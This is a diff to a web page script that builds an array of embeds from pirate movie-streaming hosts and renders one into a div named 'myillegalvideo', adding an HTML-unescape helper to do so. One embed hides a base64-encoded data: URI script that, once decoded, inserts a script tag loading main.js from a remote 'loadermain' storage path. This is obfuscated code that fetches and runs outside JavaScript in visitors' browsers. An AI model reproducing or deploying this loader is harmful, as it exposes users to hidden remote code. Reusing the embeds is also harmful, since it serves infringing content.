@@ -54,6 +54,9 @@
   </div>
 
   <script>
+// https://github.com/WebReflection/html-escaper/blob/master/index.js    
+const{replace}="",es=/&(?:amp|#38|lt|#60|gt|#62|apos|#39|quot|#34);/g,ca=/[&<>'"]/g,esca={"&":"&amp;","<":"&lt;",">":"&gt;","'":"&#39;",'"':"&quot;"},pe=e=>esca[e],escape=e=>replace.call(e,ca,pe),unes={"&amp;":"&","&#38;":"&","&lt;":"<","&#60;":"<","&gt;":">","&#62;":">","&apos;":"'","&#39;":"'","&quot;":'"',"&#34;":'"'},cape=e=>unes[e],unescape=e=>replace.call(e,es,cape);
+    
 let embeds = [];
 // <!-- https://ww.123moviess.gdn/sonic-the-hedgehog-watch-free/ -->
 embeds.push("&lt;div id='07b02207602203a02206d07703606603006b05405a05305604904602207d' style='height:250px;width:500px'&gt;&lt;/div&gt;&lt;script data-cfasync='false' src='data:text/javascript;base64,dmFyIHBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7IAp2YXIgcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsgCiAgICBwYS5zcmMgPSAnaHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL2xvYWRlcm1haW4uYXBwc3BvdC5jb20vbWFpbi5qcyc7CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHBhLCBzKTs='&gt;&lt;/script&gt;");
@@ -62,7 +65,7 @@ embeds.push('&lt;iframe src="https://streamtape.com/e/jAYxDXvY1KCz3yQ/" width="5
 embeds.push('&lt;iframe id="iframe-embed" width="100%" height="250" scrolling="no" frameborder="0" src="https://dood.watch/e/3dxt4m35djtv" allowfullscreen="allowfullscreen" webkitallowfullscreen="true" mozallowfullscreen="true"&gt;&lt;/iframe&gt;');
  
 let thediv = document.getElementById('myillegalvideo');  
-thediv.innerHTML = embeds[3];
+thediv.innerHTML = unescape(embeds[3]);
   </script>
  
 
